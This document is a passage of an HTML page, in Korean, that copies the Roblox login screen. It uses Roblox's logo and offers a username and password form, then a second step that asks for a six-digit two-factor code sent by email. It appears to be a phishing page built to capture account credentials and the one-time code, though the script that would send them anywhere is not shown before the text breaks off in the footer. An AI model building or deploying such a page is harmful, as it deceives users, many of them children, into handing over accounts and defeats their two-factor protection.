<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Roblox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans KR',sans-serif;background:#f2f2f7;color:#111;min-height:100vh;display:flex;flex-direction:column}
a{text-decoration:none}
input{outline:none}
.header{background:#101010;padding:12px 16px;display:flex;align-items:center;position:fixed;top:0;left:0;right:0;z-index:100}
.header-logo{display:flex;align-items:center;gap:8px}
.header-logo img{height:32px;display:block}
.header-logo span{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px}
.main-content{flex:1;padding:80px 24px 40px;display:flex;flex-direction:column;align-items:center}
.logo-section{text-align:center;margin:24px 0 28px}
.logo-section .logo-img{width:80px;height:80px;margin-bottom:12px}
.logo-section h1{font-size:28px;font-weight:800;color:#111}
.login-card{width:100%;max-width:400px}
.form-group{margin-bottom:20px}
.form-group label{display:block;font-size:15px;font-weight:600;color:#111;margin-bottom:6px}
.form-group input{width:100%;padding:14px 16px;border:1px solid #c8c8cd;border-radius:10px;font-size:16px;background:#fff;color:#111}
.form-group input:focus{border-color:#007aff;box-shadow:0 0 0 3px rgba(0,122,255,0.1)}
.form-group input::placeholder{color:#8e8e93}
.login-btn{width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:30px;font-size:17px;font-weight:600;margin-top:4px;cursor:pointer;transition:opacity .15s}
.login-btn:active{opacity:.8}
.forgot-link{display:block;text-align:center;margin-top:16px;font-size:15px;color:#007aff;font-weight:500}
.divider-wrap{display:flex;align-items:center;margin:24px 0;color:#8e8e93;font-size:13px}
.divider-wrap::before,.divider-wrap::after{content:'';flex:1;height:1px;background:#c8c8cd}
.divider-wrap span{padding:0 16px}
.device-btn{width:100%;padding:14px;background:#fff;color:#007aff;border:1px solid #c8c8cd;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;transition:background .15s}
.device-btn:active{background:#f2f2f7}
.signup-text{text-align:center;margin-top:28px;font-size:15px;color:#555}
.signup-text a{color:#007aff;font-weight:700}
.error-msg{color:#d32f2f;font-size:13px;margin-top:12px;display:none;padding:10px 12px;background:#fef0ef;border-radius:10px;text-align:center}
#step2fa{display:none}
.fa-header{text-align:center;margin-bottom:28px}
.fa-header .fa-img{width:80px;height:80px;margin-bottom:16px}
.fa-header h2{font-size:22px;font-weight:700;color:#111;margin-bottom:12px}
.fa-header p{font-size:15px;color:#333;line-height:1.6}
.fa-header p .fa-email{font-weight:700;color:#111}
.fa-input-wrap{display:flex;gap:8px;justify-content:center;margin:28px 0}
.fa-input-wrap input{width:46px;height:54px;text-align:center;font-size:22px;font-weight:700;border:1px solid #c8c8cd;border-radius:10px;background:#fff;color:#111;transition:border-color .15s}
.fa-input-wrap input:focus{border-color:#007aff;box-shadow:0 0 0 3px rgba(0,122,255,0.1)}
.fa-resend{text-align:center;font-size:14px;color:#555;margin-top:16px}
.fa-resend a{color:#007aff;font-weight:500}
.fa-error{color:#d32f2f;font-size:13px;margin-top:12px;display:none;padding:10px 12px;background:#fef0ef;border-radius:10px;text-align:center}
.footer{background:#101010;padding:16px 20px;text-align:center}
.footer-links{list-style:none;display:flex;flex-wrap:wrap;justify-content:center;gap:12px;margin-bottom:8px}
.footer-links a{color:#888;font-size:11px}
.footer-links a:hover{color:#fff}
.footer-copy{color:#555;font-size:11px;line-height:1.5}
</style>
</head>
<body>

<div class="header">
<a class="header-logo">
<img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox Logo">
<span>Roblox</span>
</a>
</div>

<div class="main-content">

<div id="step1">
<div class="logo-section">
<img class="logo-img" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox Logo">
<h1>Roblox</h1>
</div>
<div class="login-card">
<form id="loginForm">
<div class="form-group"><label for="username">사용자 이름</label><input type="text" id="username" placeholder="사용자 이름" required></div>
<div class="form-group"><label for="password">비밀번호</label><input type="password" id="password" placeholder="비밀번호" required></div>
<button class="login-btn" type="submit">로그인</button>
<a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요</a>
<div class="divider-wrap"><span>또는</span></div>
<button class="device-btn" type="button"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg> 다른 기기로 로그인</button>
<div class="error-msg" id="errorMsg">사용자 이름 또는 비밀번호가 올바르지 않습니다</div>
</form>
<div class="signup-text">계정이 없으신가요? <a href="#">회원가입</a></div>
</div>
</div>

<div id="step2fa">
<div class="fa-header">
<img class="fa-img" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox Logo">
<h2>2단계 인증</h2>
<p>귀하의 이메일 <span class="fa-email" id="faEmailDisplay"></span> 로 전송된 인증 코드를 입력하십시오</p>
</div>
<form id="faForm">
<div class="fa-input-wrap">
<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="0">
<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="1">
<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="2">
<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="3">
<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="4">
<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="5">
</div>
<button class="login-btn" type="submit">확인</button>
<div class="fa-resend">코드를 받지 못하셨나요? <a href="#">다시 보내기</a></div>
<div class="fa-error" id="faErrorMsg">잘못된 코드입니다 다시 시도하십시오</div>
</form>
</div>

</div>

<div class="footer">
<ul class="footer-links">
<li><a href="#">회사 소개</a></li>
<li><a href="#">인재 채용</a></li>
<li><a href="#">블로그</a></li>
<li><a href="#">보호자 가이드</a></li>
<li><a href="#">기프트 카드</a></li>
<li><a href="#">도움말</a></li>
<li><a href="#">이용 약관</a></li>
<li><a href="#">접근성</a></li>
<li><a href="#">개인정보</a></li>
